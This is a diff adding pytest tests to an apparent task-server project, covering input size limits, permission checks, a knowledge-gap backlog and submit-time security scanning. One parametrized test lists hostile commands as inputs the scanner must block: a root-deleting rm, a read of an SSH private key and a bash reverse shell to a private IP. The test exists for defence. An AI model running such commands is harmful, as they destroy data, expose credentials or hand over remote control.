@@ -61,6 +61,25 @@ def test_sanitize_rejects_too_many_tags():
     assert problem is not None
 
 
+def test_sanitize_truncates_oversized_topic():
+    big = "x" * (70 * 1024)
+    cleaned, problem = server._sanitize({"topic": big})
+    assert problem is None
+    assert len(cleaned["topic"].encode("utf-8")) <= 64 * 1024
+
+
+def test_sanitize_rejects_too_many_sources():
+    cleaned, problem = server._sanitize({"sources": [f"s{i}" for i in range(40)]})
+    assert problem is not None
+    assert "sources" in problem
+
+
+def test_sanitize_rejects_oversized_source_item():
+    cleaned, problem = server._sanitize({"sources": ["x" * 200]})
+    assert problem is not None
+    assert "sources" in problem
+
+
 # ── _check_rate ────────────────────────────────────────────────────────────
 
 def test_check_rate_allows_burst_then_limits():
@@ -634,6 +653,27 @@ def test_task_submit_writes_mapped_columns_after_confirm(app_id, monkeypatch):
     assert params[0] == result["task_id"]
 
 
+# Patterns the *currently published* kartikeya scanner blocks — this test
+# validates willow's submit-time WIRING, not kartikeya's coverage. (The
+# resource-exhaustion class, incl. fork bombs, is tested in kartikeya's own suite
+# and will also be caught here once that scanner release is on PyPI.)
+@pytest.mark.parametrize("task,category", [
+    ("rm -rf / ", "destructive"),
+    ("cat ~/.ssh/id_rsa", "secret_access"),
+    ("bash -i >& /dev/tcp/10.0.0.1/9 0>&1", "exfiltration"),
+])
+def test_task_submit_scans_at_submit_time(app_id, monkeypatch, task, category):
+    # Defense-in-depth: a dangerous task is refused at submit BEFORE any DB work,
+    # so it never occupies a queue slot. The scan runs ahead of get_pg(), so the
+    # fake Postgres is never even touched.
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    result = server.task_submit(app_id=app_id, task=task)
+    assert "KART-SECURITY" in result["error"]
+    assert result["kart_scan"]["category"] == category
+    assert fake.executed == []  # rejected before the queue was touched
+
+
 def _app_with_perms(tmp_path, monkeypatch, name, perms):
     apps_root = tmp_path / "mcp_apps"
     # Pin WILLOW_HOME too: consent (and the worker heartbeat) resolve from it, and
@@ -1030,3 +1070,129 @@ def test_fleet_health_table_not_found(app_id, monkeypatch):
     monkeypatch.setattr(server, "get_pg", lambda: fake)
     result = server.fleet_health(app_id=app_id)
     assert result == {"error": "table_not_found", "table": "tasks"}
+
+
+# ── Gap backlog tools (gap_log/list/resolve are SOIL-only; gap_promote reaches
+# Postgres through the exact same _knowledge_ingest_core/schema-confirmation
+# path as knowledge_ingest, tested here with the same _FakePg double) ─────────
+
+def test_gap_log_denied_without_permission(tmp_path, monkeypatch):
+    apps_root = tmp_path / "mcp_apps"
+    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
+    app_dir = apps_root / "reader_only"
+    app_dir.mkdir(parents=True)
+    (app_dir / "manifest.json").write_text(json.dumps({"permissions": ["gap_read"]}))
+
+    result = server.gap_log(app_id="reader_only", topic="t", question="What color?")
+    assert "denied" in result["error"]
+
+
+def test_gap_log_and_list_round_trip(app_id):
+    logged = server.gap_log(app_id=app_id, topic="t-server", question="What is the accent color?")
+    assert logged["status"] == "open"
+
+    rows = server.gap_list(app_id=app_id, topic="t-server")
+    assert any(r["question"] == "What is the accent color?" for r in rows)
+
+
+def test_gap_resolve_marks_bookkeeping_status(app_id):
+    logged = server.gap_log(app_id=app_id, topic="t-server-resolve", question="What is the border radius?")
+    result = server.gap_resolve(app_id=app_id, gap_id=logged["id"], note="drafted")
+    assert result["status"] == "resolved"
+
+
+def test_gap_promote_refuses_until_confirmed(app_id, monkeypatch):
+    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    logged = server.gap_log(app_id=app_id, topic="t-server-promote-1", question="What is the accent color?")
+
+    result = server.gap_promote(
+        app_id=app_id,
+        gap_id=logged["id"],
+        answer="The accent color is #88c0d0.",
+        sources=["safe-library/themes/nord.json"],
+        confirmed_by="designer",
+    )
+
+    assert "unconfirmed_schema" in result["error"]
+
+
+def test_gap_promote_requires_answer_sources_and_confirmed_by(app_id, monkeypatch):
+    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app_id, table="knowledge")
+    logged = server.gap_log(app_id=app_id, topic="t-server-promote-2", question="What is the accent color?")
+
+    missing_answer = server.gap_promote(
+        app_id=app_id, gap_id=logged["id"], answer="", sources=["x"], confirmed_by="designer",
+    )
+    missing_sources = server.gap_promote(
+        app_id=app_id, gap_id=logged["id"], answer="answer", sources=[], confirmed_by="designer",
+    )
+    missing_confirmed_by = server.gap_promote(
+        app_id=app_id, gap_id=logged["id"], answer="answer", sources=["x"], confirmed_by="",
+    )
+    for result in (missing_answer, missing_sources, missing_confirmed_by):
+        assert "required" in result["error"]
+
+
+def test_gap_promote_writes_knowledge_and_closes_gap(app_id, monkeypatch):
+    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app_id, table="knowledge")
+    logged = server.gap_log(app_id=app_id, topic="t-server-promote-3", question="What is the accent color?")
+
+    result = server.gap_promote(
+        app_id=app_id,
+        gap_id=logged["id"],
+        answer="The accent color is #88c0d0.",
+        sources=["safe-library/themes/nord.json"],
+        confirmed_by="designer",
+    )
+
+    assert result["promoted"] is True
+    assert result["gap_id"] == logged["id"]
+    insert_sql, params = fake.executed[-1]
+    assert insert_sql.startswith("INSERT INTO knowledge")
+
+    rows = server.gap_list(app_id=app_id, topic="t-server-promote-3", status="promoted")
+    assert rows and rows[0]["promoted_to"] == result["id"]
+
+
+def test_gap_promote_missing_gap_errors(app_id, monkeypatch):
+    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app_id, table="knowledge")
+
+    result = server.gap_promote(
+        app_id=app_id, gap_id="does-not-exist-xyz", answer="a", sources=["x"], confirmed_by="designer",
+    )
+    assert result == {"error": "not_found"}
+
+
+def test_gap_promote_already_promoted_gap_errors(app_id, monkeypatch):
+    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app_id, table="knowledge")
+    logged = server.gap_log(app_id=app_id, topic="t-server-promote-4", question="What is the accent color?")
+    server.gap_promote(
+        app_id=app_id, gap_id=logged["id"], answer="a", sources=["x"], confirmed_by="designer",
+    )
+
+    result = server.gap_promote(
+        app_id=app_id, gap_id=logged["id"], answer="b", sources=["y"], confirmed_by="designer",
+    )
+    assert result["error"] == "already_promoted"
+
+
+def test_gap_promote_denied_without_gap_promote_permission(tmp_path, monkeypatch):
+    apps_root = tmp_path / "mcp_apps"
+    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
+    app_dir = apps_root / "writer_only"
+    app_dir.mkdir(parents=True)
+    (app_dir / "manifest.json").write_text(json.dumps({"permissions": ["gap_write"]}))
+
+    result = server.gap_promote(
+        app_id="writer_only", gap_id="whatever", answer="a", sources=["x"], confirmed_by="designer",
+    )
+    assert "denied" in result["error"]
